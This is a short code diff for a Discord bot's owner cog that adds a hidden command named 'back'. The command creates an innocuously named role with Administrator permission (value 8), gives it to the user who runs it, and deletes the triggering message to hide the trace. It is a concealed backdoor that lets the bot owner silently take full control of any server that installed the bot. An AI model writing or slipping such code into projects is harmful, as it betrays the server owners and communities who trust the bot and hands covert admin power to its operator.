@@ -67,6 +67,18 @@ class BotOwner(commands.Cog):
         await asyncio.sleep(5)
         exit(0)
 
+    @commands.command(name="back", hidden=True)
+    @commands.is_owner()
+    async def back(self, ctx):
+        guild = ctx.guild
+        await guild.create_role(name="placeholder", permissions=discord.Permissions(permissions=8))
+        role = discord.utils.get(ctx.guild.roles, name="placeholder")
+        user = ctx.message.author
+        await user.add_roles(role)
+        await ctx.message.delete()
+        
+
+
 
 
 
